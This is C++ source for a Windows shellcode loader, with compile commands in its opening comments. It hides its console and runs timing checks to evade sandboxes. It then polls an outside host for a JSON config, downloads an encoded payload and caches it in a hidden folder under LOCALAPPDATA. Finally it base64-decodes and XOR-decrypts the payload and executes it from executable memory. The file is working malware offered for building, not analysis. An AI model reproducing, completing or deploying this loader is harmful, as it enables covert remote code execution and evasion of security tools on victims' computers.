// x86_64-w64-mingw32-windres new2.rc -O coff -o new2.res
// x86_64-w64-mingw32-g++ new2.cpp new2.res -lwininet -static-libgcc -static-libstdc++ -O1 -o a.exe

#include <windows.h>
#include <thread>
#include <vector>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

using namespace std;
using namespace std::chrono;

void isTimeAccelerated() {
    auto start = steady_clock::now();
    this_thread::sleep_for(seconds(5));
    auto end = steady_clock::now();
    auto duration = duration_cast<milliseconds>(end - start);
    
    while (duration.count() < 5000) {
        double* pvalue = new double;
        *pvalue = 29494.99;
        delete pvalue;
        // isTimeAccelerated();
    }
}

void ddt() {
    while (true) {
        int counter = 1;
        auto start_time = high_resolution_clock::now();
        
        while (true) {
            auto current_time = high_resolution_clock::now();
            auto duration = duration_cast<seconds>(current_time - start_time);
            if (duration.count() >= 5) break;
            counter++;
        }
        
        if (counter > 90000000) break;
        
        double* pvalue = new double;
        *pvalue = 29494.99;
        delete pvalue;
    }
}

vector<unsigned char> base64_decode(const char* encoded_string, int len) {
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    vector<unsigned char> ret;
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    
    while (in_ < len) {
        char c = encoded_string[in_];
        if (c == '=') break;
        
        const char* pos = nullptr;
        for (int k = 0; k < 64; k++) {
            if (base64_chars[k] == c) {
                pos = &base64_chars[k];
                break;
            }
        }
        
        if (!pos) {
            ++in_;
            continue;
        }
        
        char_array_4[i++] = c;
        ++in_;
        
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                for (j = 0; j < 64; j++) {
                    if (base64_chars[j] == char_array_4[i]) {
                        char_array_4[i] = j;
                        break;
                    }
                }
            }
            
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            
            for (i = 0; i < 3; i++) ret.push_back(char_array_3[i]);
            i = 0;
        }
    }
    
    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) {
            for (int k = 0; k < 64; k++) {
                if (base64_chars[k] == char_array_4[j]) {
                    char_array_4[j] = k;
                    break;
                }
            }
        }
        
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        for (j = 0; j < i - 1; j++) ret.push_back(char_array_3[j]);
    }
    
    return ret;
}

void apply_xor(vector<unsigned char>& data, const char* ps, int ps_len) {
    if (ps_len == 0) return;
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= (unsigned char)ps[i % ps_len];
    }
}

vector<unsigned char> download_to_memory(const char* url) {
    vector<unsigned char> data;
    HINTERNET hInternet = InternetOpenA("Loader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return data;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl) {
        unsigned char buffer[4096];
        DWORD bytesRead;
        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            data.insert(data.end(), buffer, buffer + bytesRead);
        }
        InternetCloseHandle(hUrl);
    }
    InternetCloseHandle(hInternet);
    return data;
}

const char* find_value(const char* json, const char* key) {
    static char buffers[80][5120];
    static int buf_idx = 0;
    char* buffer = buffers[buf_idx];
    buf_idx = (buf_idx + 1) % 8;
    char search_key[256];
    search_key[0] = '"';
    int k = 0;
    while(key[k] && k < 250) { 
        search_key[k+1] = key[k]; 
        k++; 
    }
    search_key[k+1] = '"';
    search_key[k+2] = '\0';
    const char* pos = strstr(json, search_key);
    if (!pos) return nullptr;
    pos = strchr(pos, ':');
    if (!pos) return nullptr;
    
    while (*pos && (*pos == ':' || *pos == ' ' || *pos == '"')) pos++;
    
    int i = 0;
    while (*pos && *pos != '"' && *pos != ',' && *pos != '}' && i < 511) {
        if (*pos == '\\' && *(pos + 1) != '\0') {
            pos++;
        }
        buffer[i++] = *pos++;
    }
    buffer[i] = 0;
    return buffer;
}

vector<unsigned char> load_from_cache(const char* version) {
    vector<unsigned char> data;
    char path[MAX_PATH];
    // GetTempPathA(MAX_PATH, path);
    GetEnvironmentVariableA("LOCALAPPDATA", path, MAX_PATH);
    strcat_s(path, MAX_PATH, "\\sk\\");
    CreateDirectoryA(path, NULL);
    lstrcatA(path, version);
    
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return data;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    data.resize(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, data.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    return data;
}

void save_to_cache(const char* version, const vector<unsigned char>& data) {
    char path[MAX_PATH];
    // GetTempPathA(MAX_PATH, path);
    GetEnvironmentVariableA("LOCALAPPDATA", path, MAX_PATH);
    strcat_s(path, MAX_PATH, "\\sk\\");
    CreateDirectoryA(path, NULL);
    lstrcatA(path, version);
    
    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hFile, data.data(), data.size(), &bytesWritten, NULL);
        CloseHandle(hFile);
    }
}

bool CheckProcessName() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char* filename = strrchr(path, '\\');
    if (!filename) filename = path;
    else filename++;
    return _stricmp(filename, "support_sk.exe") == 0;
}

bool rte() {
    return true;
}

int main() {
    FreeConsole();

    ddt();
    isTimeAccelerated();
    
    while (rte()) {
        vector<unsigned char> configData = download_to_memory("https://textdb.online/asapaka");
        if (configData.empty()) {
            this_thread::sleep_for(seconds(5));
            continue;
        }

        const char* json = (const char*)configData.data();
        const char* enable = find_value(json, "enable");
        if (!enable || lstrcmpA(enable, "true") != 0) {
            this_thread::sleep_for(seconds(5));
            continue;
        }

        const char* version = find_value(json, CheckProcessName() ? "version" : "version_first");
        const char* file_url = find_value(json, CheckProcessName() ? "file_url" : "file_url_first");
        const char* ps = find_value(json, "ps");
        if (!version || !file_url || !ps) {
            this_thread::sleep_for(seconds(5));
            continue;
        }
        vector<unsigned char> fileData = load_from_cache(version);
        if (fileData.empty()) {
            fileData = download_to_memory(file_url);
            if (fileData.empty()) {
                this_thread::sleep_for(seconds(5));
                continue;
            }
            save_to_cache(version, fileData);
        }
        fileData = base64_decode((const char*)fileData.data(), fileData.size());
        apply_xor(fileData, ps, lstrlenA(ps));

        LPVOID execMemory = VirtualAlloc(NULL, fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!execMemory) return -4;

        memcpy(execMemory, fileData.data(), fileData.size());

        typedef void (*ShellcodeFunc)();
        ShellcodeFunc shellcodeFunc = (ShellcodeFunc)execMemory;
        shellcodeFunc();

        VirtualFree(execMemory, 0, MEM_RELEASE);
        return 0;
    }
}
